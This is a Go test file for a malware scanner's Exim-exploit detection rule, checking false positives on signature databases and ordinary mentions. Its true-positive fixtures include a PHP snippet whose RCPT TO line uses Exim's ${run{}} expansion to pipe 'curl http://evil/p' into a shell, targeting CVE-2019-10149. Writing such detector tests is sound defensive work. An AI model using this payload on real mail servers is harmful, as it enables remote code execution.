package signatures

import (
	"bytes"
	"testing"
)

// mailer_exim_exploit paired the bare word "exim" with a regex whose gap was
// unbounded: "exim.*(?:CVE|exploit|bypass)". Go's dot does not cross newlines,
// but a security plugin's signature database is serialized onto very long
// lines, so the gap spans megabytes and joins an "exim" to a "CVE" that have
// nothing to do with each other. Two weak matches then satisfy min_match with
// no exploit primitive anywhere in the file.
//
// This is what a WordPress firewall's own rule set looks like to the scanner:
// prose *about* exim exploits, which is exactly what it is paid to contain.
func TestFPExim_SignatureDatabaseBlobNotMatched(t *testing.T) {
	s := loadRepoScanner(t)

	var blob bytes.Buffer
	blob.WriteString("<?php exit('Access denied'); __halt_compiler(); ?>\n")
	// One enormous line, the way these files are actually written.
	blob.WriteString(`a:3:{s:5:"rules";a:2:{i:0;a:2:{s:4:"name";s:22:"exim local privilege";s:4:"desc";s:64:"detects attempts against the exim MTA";}`)
	blob.WriteString(bytes.NewBuffer(bytes.Repeat([]byte("x"), 200000)).String())
	blob.WriteString(`i:1;a:2:{s:4:"name";s:30:"CVE-2019-10149 remote command";s:4:"desc";s:40:"exploit attempt signature";}}}`)

	if hasRule(s.ScanContent(blob.Bytes(), ".php"), "mailer_exim_exploit") {
		t.Error("mailer_exim_exploit FP: matched a security plugin's signature database")
	}
}

// A genuine Exim relay exploit must still be caught. Both arms are exercised:
// the command-execution primitive, and an exploit that names its CVE close to
// the word it applies to.
func TestFPExim_RealExploitStillDetected(t *testing.T) {
	s := loadRepoScanner(t)

	runPrimitive := []byte(`<?php
// exim relay
$s = fsockopen($host, 25);
fwrite($s, "MAIL FROM:<x@y.z>\r\n");
fwrite($s, "RCPT TO:<${run{/bin/sh -c 'curl http://evil/p|sh'}}@localhost>\r\n");
`)
	if !hasRule(s.ScanContent(runPrimitive, ".php"), "mailer_exim_exploit") {
		t.Error("mailer_exim_exploit regression: ${run{ command execution not detected")
	}

	namedCVE := []byte(`<?php
# exim CVE-2019-10149 exploit for unauthorized relay
$s = fsockopen($target, 25);
fwrite($s, "MAIL FROM:<attacker@evil.tld>\r\n");
`)
	if !hasRule(s.ScanContent(namedCVE, ".php"), "mailer_exim_exploit") {
		t.Error("mailer_exim_exploit regression: exploit naming its CVE inline not detected")
	}
}

// The word "exim" in ordinary configuration or documentation is not an
// exploit, and never was enough on its own.
func TestFPExim_OrdinaryMentionNotMatched(t *testing.T) {
	s := loadRepoScanner(t)

	doc := []byte(`<?php
// Mail is delivered by exim on this host. See the exim documentation for
// details of how the transport is configured.
$mta = 'exim';
`)
	if hasRule(s.ScanContent(doc, ".php"), "mailer_exim_exploit") {
		t.Error("mailer_exim_exploit FP: matched an ordinary mention of exim")
	}
}
